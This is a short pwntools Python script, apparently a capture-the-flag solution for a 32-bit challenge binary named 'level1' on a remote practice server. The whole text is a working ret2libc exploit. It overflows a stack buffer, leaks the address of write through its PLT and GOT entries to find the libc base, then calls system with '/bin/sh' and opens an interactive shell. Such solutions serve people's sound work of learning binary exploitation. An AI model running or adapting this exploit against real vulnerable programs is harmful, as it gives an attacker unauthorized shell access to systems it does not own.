from pwn import *

#p = process('./level1')
p = remote('node4.buuoj.cn', 25897)
elf = ELF('level1')

libc = ELF('libc-2.23.so')

main_addr = elf.sym['main']
write_plt = elf.plt['write']
write_got = elf.got['write']

payload = b'a' * ( 0x88 + 4 ) + p32(write_plt) + p32(main_addr)
payload += p32(1) + p32(write_got) + p32(4)


p.sendline(payload)

write_real_addr = u32(p.recv(4))

libc_base = write_real_addr - libc.sym['write']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * ( 0x88 + 4 ) + p32(system) + b'aaaa' + p32(bin_sh)

p.sendline(payload)

p.interactive()
